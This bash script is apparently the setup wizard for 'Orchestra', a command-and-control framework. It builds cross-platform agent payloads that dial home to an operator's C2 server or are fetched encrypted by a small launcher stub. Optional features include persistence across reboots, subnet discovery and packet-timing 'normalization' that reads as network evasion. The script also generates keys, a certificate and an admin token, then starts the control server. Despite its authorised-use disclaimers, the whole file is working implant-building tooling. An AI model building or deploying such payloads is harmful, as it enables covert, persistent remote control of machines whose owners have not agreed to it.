#!/usr/bin/env bash
# setup.sh — Interactive Orchestra setup wizard.
#
# Walks an operator step-by-step through:
#   1. Verifying / installing the Rust toolchain.
#   2. Picking the target OS / architecture for the agent payload.
#   3. Picking the deployment style (launcher + payload OR self-contained
#      outbound agent that dials the Control Center).
#   4. Picking the C2 / Control-Center address (auto-detects LAN IP).
#   5. Optional Cargo features.
#   6. Generating strong AES key, agent PSK, and admin bearer token.
#   7. Generating a self-signed TLS cert covering the chosen address.
#   8. Writing profiles/<name>.toml and orchestra-server.toml.
#   9. Cross-compiling the payload (uses cargo-zigbuild on Linux when
#      mingw-w64 is unavailable, so no sudo is required for Windows
#      cross-builds).
#  10. Building & optionally launching the Control Center.
#
# This script is intended for use on systems you own or manage.

set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

# -------- helpers -----------------------------------------------------------

C_BLU='\033[1;34m'; C_GRN='\033[1;32m'; C_YEL='\033[1;33m'; C_RED='\033[1;31m'; C_OFF='\033[0m'
say()  { printf "${C_BLU}[setup]${C_OFF} %s\n" "$*"; }
ok()   { printf "${C_GRN}[ ok ]${C_OFF} %s\n" "$*"; }
warn() { printf "${C_YEL}[warn]${C_OFF} %s\n" "$*" >&2; }
die()  { printf "${C_RED}[fail]${C_OFF} %s\n" "$*" >&2; exit 1; }

# `prompt VAR "Question" [default]`
prompt() {
    local __var="$1" __q="$2" __def="${3:-}" __reply
    if [[ -n "$__def" ]]; then
        read -r -p "$(printf '%b' "${C_BLU}?${C_OFF} ${__q} [${__def}]: ")" __reply </dev/tty || true
        __reply="${__reply:-$__def}"
    else
        read -r -p "$(printf '%b' "${C_BLU}?${C_OFF} ${__q}: ")" __reply </dev/tty || true
    fi
    printf -v "$__var" '%s' "$__reply"
}

# `choose VAR "Question" "opt1" "opt2" ...`
choose() {
    local __var="$1" __q="$2"; shift 2
    local opts=("$@") i=1 reply
    printf "${C_BLU}?${C_OFF} %s\n" "$__q"
    for o in "${opts[@]}"; do
        printf "    %d) %s\n" "$i" "$o"
        i=$((i + 1))
    done
    while :; do
        read -r -p "  choose 1-${#opts[@]}: " reply </dev/tty || true
        if [[ "$reply" =~ ^[0-9]+$ ]] && (( reply >= 1 && reply <= ${#opts[@]} )); then
            printf -v "$__var" '%s' "${opts[$((reply - 1))]}"
            return
        fi
        warn "invalid choice"
    done
}

confirm() {
    local reply
    read -r -p "$(printf '%b' "${C_BLU}?${C_OFF} ${1} [y/N]: ")" reply </dev/tty || true
    [[ "$reply" =~ ^[Yy]$ ]]
}

# -------- 0. preflight ------------------------------------------------------

cat <<BANNER
================================================================================
 Orchestra step-by-step setup wizard
 Project root: $ROOT
================================================================================
BANNER

if ! command -v cargo >/dev/null 2>&1; then
    warn "Rust toolchain (cargo) not found."
    if confirm "Install Rust now via rustup (no sudo)?"; then
        curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --default-toolchain stable
        # shellcheck disable=SC1090
        source "$HOME/.cargo/env"
    else
        die "Rust is required. Install from https://rustup.rs and re-run."
    fi
fi
ok "cargo: $(cargo --version)"

# -------- 1. profile name ---------------------------------------------------

prompt PROFILE_NAME "Profile name (alphanumeric, used for profile + payload filenames)" "my_agent"
[[ "$PROFILE_NAME" =~ ^[A-Za-z0-9_-]+$ ]] || die "invalid profile name"
PROFILE_PATH="profiles/${PROFILE_NAME}.toml"
if [[ -f "$PROFILE_PATH" ]]; then
    confirm "Profile $PROFILE_PATH already exists. Overwrite?" || die "aborted"
fi

# -------- 2. target OS / arch ----------------------------------------------

choose TARGET_OS "Target operating system for the payload?" \
    "linux   (x86_64-unknown-linux-gnu)" \
    "windows (x86_64-pc-windows-gnu / .exe)" \
    "macos   (x86_64-apple-darwin)"
TARGET_OS="${TARGET_OS%% *}"  # keep first word

choose TARGET_ARCH "Target CPU architecture?" "x86_64" "aarch64"

# -------- 3. deployment style ----------------------------------------------

choose DEPLOY "Deployment style?" \
    "outbound  — single self-contained binary that dials the Control Center (recommended)" \
    "launcher  — small stub fetches an AES-encrypted agent payload over HTTP"
DEPLOY="${DEPLOY%% *}"

# -------- 4. addresses ------------------------------------------------------

# Detect LAN IP for default
DETECTED_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
[[ -z "$DETECTED_IP" ]] && DETECTED_IP="127.0.0.1"

if [[ "$DEPLOY" == "outbound" ]]; then
    prompt C2_HOST "Control Center host/IP the payload should dial home to" "$DETECTED_IP"
    prompt C2_PORT "Control Center agent port" "8444"
    prompt HTTP_PORT "Control Center HTTPS dashboard port" "8443"
else
    prompt C2_HOST "C2 host/IP the agent should connect to (or listen on)" "$DETECTED_IP"
    prompt C2_PORT "C2 port" "7890"
    prompt HTTP_PORT "Control Center HTTPS dashboard port (if you also run the server)" "8443"
fi
C2_ADDR="${C2_HOST}:${C2_PORT}"
say "C2 address baked into payload: $C2_ADDR"

# -------- 5. optional features ---------------------------------------------

FEATURES=()
if [[ "$DEPLOY" == "outbound" ]]; then
    FEATURES+=("outbound-c")
fi

cat <<EOF

Optional Cargo features (off by default; enable per-deployment as needed):
  persistence            — re-launch agent across reboots (systemd / launchd / scheduled task)
  network-discovery      — passive subnet enumeration for inventory
  perf-optimize          — CPU-microarch-aware tuning
  traffic-normalization  — packet timing/size normalisation for QoS-strict networks
EOF
prompt EXTRA_FEAT "Comma-separated extras to enable (Enter for none)" ""
if [[ -n "$EXTRA_FEAT" ]]; then
    IFS=',' read -ra parts <<<"$EXTRA_FEAT"
    for f in "${parts[@]}"; do
        f="${f// /}"
        [[ -n "$f" ]] && FEATURES+=("$f")
    done
fi
say "Features: ${FEATURES[*]:-<none>}"

# -------- 6. credentials ----------------------------------------------------

mkdir -p secrets profiles dist

gen_b64() { head -c "$1" /dev/urandom | base64 | tr -d '\n'; }
AES_KEY=$(gen_b64 32)
AGENT_SECRET=$(gen_b64 32)
ADMIN_TOKEN=$(gen_b64 24 | tr '+/' '-_' | tr -d '=')

CRED_FILE="secrets/${PROFILE_NAME}.env"
umask 077
cat > "$CRED_FILE" <<EOF
# Orchestra credentials for profile: ${PROFILE_NAME}
# Generated: $(date -u +%FT%TZ)
PROFILE_NAME=${PROFILE_NAME}
TARGET_OS=${TARGET_OS}
TARGET_ARCH=${TARGET_ARCH}
DEPLOY=${DEPLOY}
C2_ADDR=${C2_ADDR}
HTTP_PORT=${HTTP_PORT}
AES_KEY=${AES_KEY}
AGENT_SECRET=${AGENT_SECRET}
ADMIN_TOKEN=${ADMIN_TOKEN}
EOF
ok "credentials saved: $CRED_FILE (chmod 600)"

# -------- 7. TLS cert -------------------------------------------------------

CERT="secrets/${PROFILE_NAME}-server.crt"
KEY="secrets/${PROFILE_NAME}-server.key"
if [[ ! -f "$CERT" || ! -f "$KEY" ]]; then
    say "Generating self-signed TLS cert covering 127.0.0.1, ${C2_HOST}, localhost"
    openssl req -x509 -nodes -newkey ec -pkeyopt ec_paramgen_curve:P-256 -days 365 \
        -keyout "$KEY" -out "$CERT" \
        -subj "/CN=orchestra-control-center" \
        -addext "subjectAltName=IP:127.0.0.1,IP:${C2_HOST},DNS:localhost" \
        >/dev/null 2>&1 \
        || die "openssl failed (is openssl installed?)"
    chmod 600 "$KEY"
    ok "TLS material: $CERT / $KEY"
fi

# -------- 8. write profile + server config ---------------------------------

# Build features TOML array literal.
feat_toml="["
first=1
for f in "${FEATURES[@]}"; do
    if [[ $first -eq 1 ]]; then first=0; else feat_toml+=", "; fi
    feat_toml+="\"$f\""
done
feat_toml+="]"

if [[ "$DEPLOY" == "outbound" ]]; then
    PACKAGE="agent"
    BIN_NAME="agent-standalone"
else
    PACKAGE="launcher"
    BIN_NAME=""
fi

{
    echo "# Auto-generated by scripts/setup.sh on $(date -u +%FT%TZ)"
    echo "target_os         = \"${TARGET_OS}\""
    echo "target_arch       = \"${TARGET_ARCH}\""
    echo "c2_address        = \"${C2_ADDR}\""
    echo "encryption_key    = \"${AES_KEY}\""
    if [[ "$DEPLOY" == "outbound" ]]; then
        echo "c_server_secret   = \"${AGENT_SECRET}\""
    fi
    echo "features          = ${feat_toml}"
    echo "package           = \"${PACKAGE}\""
    [[ -n "$BIN_NAME" ]] && echo "bin_name          = \"${BIN_NAME}\""
} > "$PROFILE_PATH"
ok "profile written: $PROFILE_PATH"

SERVER_CFG="orchestra-server.toml"
if [[ ! -f "$SERVER_CFG" ]] || confirm "Overwrite existing $SERVER_CFG with new credentials?"; then
    cat > "$SERVER_CFG" <<EOF
# Auto-generated by scripts/setup.sh
http_addr           = "0.0.0.0:${HTTP_PORT}"
agent_addr          = "0.0.0.0:${C2_PORT}"
agent_shared_secret = "${AGENT_SECRET}"
admin_token         = "${ADMIN_TOKEN}"
audit_log_path      = "secrets/orchestra-audit.jsonl"
static_dir          = "orchestra-server/static"
tls_cert_path       = "${CERT}"
tls_key_path        = "${KEY}"
command_timeout_secs = 30
EOF
    ok "server config: $SERVER_CFG"
fi

# -------- 9. build orchestra-builder + payload -----------------------------

say "Building orchestra-builder (release)…"
cargo build --release -p builder >/dev/null 2>&1 || die "builder compile failed"
BUILDER="$ROOT/target/release/orchestra-builder"
ok "builder ready: $BUILDER"

say "Verifying build dependencies…"
"$BUILDER" setup --auto-install || warn "setup reported issues; review above"

# Cross-compile strategy ------------------------------------------------------
need_zig() {
    [[ "$TARGET_OS" == "windows" && "$(uname -s)" == "Linux" ]] && \
    ! command -v x86_64-w64-mingw32-gcc >/dev/null 2>&1
}

build_payload_with_zig() {
    say "mingw-w64 not available — using cargo-zigbuild for the Windows cross-compile"
    if ! command -v zig >/dev/null 2>&1; then
        say "Installing Zig 0.13 to ~/.local/bin (no sudo)…"
        mkdir -p "$HOME/.local/zig" "$HOME/.local/bin"
        (cd "$HOME/.local/zig" && \
            curl -sSL -o zig.tar.xz https://ziglang.org/download/0.13.0/zig-linux-x86_64-0.13.0.tar.xz && \
            tar xf zig.tar.xz && rm zig.tar.xz && \
            ln -sf "$PWD/zig-linux-x86_64-0.13.0/zig" "$HOME/.local/bin/zig")
        export PATH="$HOME/.local/bin:$PATH"
    fi
    if ! command -v cargo-zigbuild >/dev/null 2>&1; then
        say "Installing cargo-zigbuild…"
        cargo install --locked cargo-zigbuild >/dev/null
    fi
    local triple="x86_64-pc-windows-gnu"
    [[ "$TARGET_ARCH" == "aarch64" ]] && triple="aarch64-pc-windows-gnullvm"
    rustup target add "$triple" >/dev/null 2>&1 || true

    local extra_env=()
    if [[ "$DEPLOY" == "outbound" ]]; then
        extra_env+=(ORCHESTRA_C_ADDR="$C2_ADDR" ORCHESTRA_C_SECRET="$AGENT_SECRET")
    fi
    local feat_args=()
    if [[ ${#FEATURES[@]} -gt 0 ]]; then
        feat_args=(--features "$(IFS=,; echo "${FEATURES[*]}")")
    fi
    local bin_args=(-p "$PACKAGE")
    [[ -n "$BIN_NAME" ]] && bin_args+=(--bin "$BIN_NAME")
    env "${extra_env[@]}" cargo zigbuild --release --target "$triple" \
        "${bin_args[@]}" "${feat_args[@]}"

    local out="target/${triple}/release/${BIN_NAME:-launcher}.exe"
    [[ -f "$out" ]] || out="target/${triple}/release/${PACKAGE}.exe"
    cp "$out" "dist/${PROFILE_NAME}.exe"
    ok "Windows payload: dist/${PROFILE_NAME}.exe ($(du -h dist/${PROFILE_NAME}.exe | cut -f1))"
    PAYLOAD_PATH="dist/${PROFILE_NAME}.exe"
}

if need_zig; then
    build_payload_with_zig
else
    say "Building payload via orchestra-builder…"
    "$BUILDER" build "$PROFILE_NAME"
    PAYLOAD_PATH="dist/${PROFILE_NAME}.enc"
    [[ "$DEPLOY" == "outbound" ]] && PAYLOAD_PATH="dist/${PROFILE_NAME}.enc"
    ok "payload: $PAYLOAD_PATH"
fi

# -------- 10. optionally start the server -----------------------------------

cat <<EOF

================================================================================
 Setup complete.

 Profile           : $PROFILE_PATH
 Credentials       : $CRED_FILE   (mode 600 — keep private!)
 Payload           : $PAYLOAD_PATH
 Server config     : $SERVER_CFG
 Dashboard URL     : https://${C2_HOST}:${HTTP_PORT}/
 Admin bearer token: ${ADMIN_TOKEN}

 Reminder: only deploy to systems you own or are authorised to manage.
================================================================================
EOF

if confirm "Start the Orchestra Control Center now?"; then
    cargo build --release -p orchestra-server >/dev/null 2>&1 || die "server compile failed"
    pkill -f 'orchestra-server --config' 2>/dev/null || true
    sleep 1
    nohup "$ROOT/target/release/orchestra-server" --config "$SERVER_CFG" \
        >secrets/server.log 2>&1 &
    SERVER_PID=$!
    sleep 2
    if kill -0 "$SERVER_PID" 2>/dev/null; then
        ok "server running (PID $SERVER_PID), log: secrets/server.log"
        echo
        echo "  Open:   https://${C2_HOST}:${HTTP_PORT}/"
        echo "  Token:  ${ADMIN_TOKEN}"
        echo
        echo "  Stop:   kill $SERVER_PID"
    else
        warn "server failed to start; see secrets/server.log"
    fi
else
    cat <<EOF

To start it later:
    ./target/release/orchestra-server --config $SERVER_CFG

EOF
fi
